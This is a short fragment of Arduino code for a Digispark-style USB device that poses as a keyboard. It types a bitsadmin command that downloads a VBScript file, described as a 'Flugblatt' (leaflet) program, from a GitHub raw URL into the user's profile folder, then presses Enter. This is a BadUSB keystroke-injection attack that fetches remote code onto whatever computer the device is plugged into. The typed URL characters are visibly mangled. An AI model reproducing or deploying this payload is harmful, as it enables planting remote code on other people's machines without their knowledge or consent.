...
void setup() {
  ...
  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&raw.githubusercontent.com&gregthwuen&Digitale/Flugblaetter&master&Yus%C3%A4tylicher%20Dowload&Flugblatt05.vbs %USERPROFILE%&Flugblatt05.vbs");//Downloadet das Flugblatt-Programm 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
